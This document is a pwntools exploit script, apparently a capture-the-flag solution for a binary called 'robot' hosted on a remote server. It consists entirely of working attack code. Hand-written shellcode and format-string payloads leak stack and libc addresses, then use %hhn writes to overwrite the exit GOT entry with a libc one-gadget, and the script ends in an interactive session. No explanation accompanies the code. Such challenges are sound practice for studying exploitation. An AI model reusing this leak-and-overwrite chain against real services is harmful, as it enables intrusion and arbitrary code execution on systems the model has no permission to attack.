from pwn import *

if args['LOCAL']:
    io = process(['./ld-2.29.so', './robot'], env = {'LD_PRELOAD': './libc.so.6'})
else:
    io = remote('140.112.31.97', 30202)

context.arch = 'amd64'

shellcode = asm('''
    mov rbx, rdx
    lea rsp, [rbx + 0xe00]
    mov rbp, rsp

    mov r13, 0x400

    mov r10, r13
    call connect
    lea r10, [r13 + 1]
    call resolve
    mov QWORD PTR [rbp + 0x8], rax # stack
    add r13, 0x20

    mov r10, r13
    call connect
    lea r10, [r13 + 1]
    call resolve
    sub rax, 0x26b6b
    add rax, 0x106ef8
    mov QWORD PTR [rbp + 0x10], rax # libc one gadget
    add r13, 0x20

    mov r10, r13
    call connect
    lea r10, [r13 + 1]
    call resolve
    sub rax, 0x1a40
    add rax, 0x4060
    mov QWORD PTR [rbp + 0x18], rax # exit got
    add r13, 0x20

    mov r10, r13
    call connect
    lea r10, [r13 + 1]
    call resolve
    mov QWORD PTR [rbp + 0x20], rax
    add r13, 0x20

    mov r12, 0x0
writes:
    movzx r10, BYTE PTR [rbp + 0x20]
    add r10, r12
    mov r11, r13
    xor r15, r15
    call todec
    mov r10, r13
    call connect

    add r13, 0x20
    mov r10, rbp
    add r10, r12
    add r10, 0x18
    movzx r10, BYTE PTR [r10]
    mov r11, r13
    xor r15, r15
    call todec
    mov r10, r13
    call connect

    inc r12
    add r13, 0x20
    cmp r12, 0x8
    jne writes

    movzx r10, BYTE PTR [rbp + 0x20] # reset
    mov r11, r13
    xor r15, r15
    call todec
    mov r10, r13
    call connect
    add r13, 0x20

    

    mov r12, 0x0
writes2:
    movzx r10, BYTE PTR [rbp + 0x18]
    add r10, r12
    mov r11, r13
    xor r15, r15
    call todec
    mov r10, r13
    call connect
    add r13, 0x20
    mov r10, rbp
    add r10, r12
    add r10, 0x10
    movzx r10, BYTE PTR [r10]
    mov r11, r13
    mov r15, QWORD PTR [rbp + 0x20]
    mov r14, QWORD PTR [rbp + 0x8]
    sub r15, r14
    shr r15, 3
    add r15, 62
    call todec
    mov r10, r13
    call connect
    inc r12
    add r13, 0x20
    cmp r12, 0x8
    jne writes2

    mov r10, r13
    call connect

    mov rax, 0x3c
    mov rdi, 0
    syscall

connect:
    mov rax, 1
    mov rdi, 6
    lea rsi, [rbx + r10]
    mov rdx, 0x20
    syscall

    mov rax, 0
    mov rdi, 3
    lea rsi, [rbx + r10]
    mov rdx, 0x20
    syscall

    ret
    
resolve:
    xor rax, rax
    xor rcx, rcx
    xor r8, r8
    xor r9, r9
    loop0:
        mov r8, rbx
        add r8, r10
        add r8, rcx
        mov r9b, BYTE PTR [r8]
        cmp r9, 0x61
        jl digit
            sub r9, 0x57
            jmp out
        digit:
            sub r9, 0x30
        out:
            shl rax, 4
            add rax, r9
        incr:
        inc rcx
        cmp rcx, 0x10
        jl loop0
    ret

todec:
    mov rax, r10
    test rax, rax
    je iszero
        dec rax
        jmp findec
    iszero:
        mov rax, 0xff
    findec:
    add r11, 2
    mov rdi, 9
    inc rdi
    mov rsi, 3
    loop1:
        xor rdx, rdx
        dec rsi
        div rdi
        add rdx, 0x30
        mov r8, rbx
        add r8, r11
        add r8, rsi
        mov BYTE PTR [r8], dl
        test rsi, rsi
        jne loop1

    test r15, r15
    je skip
    mov rax, r15
    add r11, 5
    mov rdi, 9
    inc rdi
    mov rsi, 3
    loop2:
        xor rdx, rdx
        dec rsi
        div rdi
        add rdx, 0x30
        mov r8, rbx
        add r8, r11
        add r8, rsi
        mov BYTE PTR [r8], dl
        test rsi, rsi
        jne loop2
    skip:
        ret


''')
addr = 0x400
shellcode = shellcode.ljust(addr) + b'M%36$016lx'
addr += 0x20
shellcode = shellcode.ljust(addr) + b'M%34$016lx'
addr += 0x20
shellcode = shellcode.ljust(addr) + b'M%33$016lx'
addr += 0x20
shellcode = shellcode.ljust(addr) + b'M%62$016lx'
addr += 0x20

for i in range(8):
    shellcode = shellcode.ljust(addr) + b'M%000c%36$hhn'
    addr += 0x20
    shellcode = shellcode.ljust(addr) + b'M%000c%62$hhn'
    addr += 0x20

shellcode = shellcode.ljust(addr) + b'M%000c%36$hhn'
addr += 0x20

for i in range(8):
    shellcode = shellcode.ljust(addr) + b'M%000c%62$hhn'
    addr += 0x20
    shellcode = shellcode.ljust(addr) + b'M%000c%000$hhn'
    addr += 0x20

shellcode = shellcode.ljust(addr) + b'G'

if args['GDB']:
    pause()

io.sendlineafter('Give me code : ', shellcode)

io.interactive()
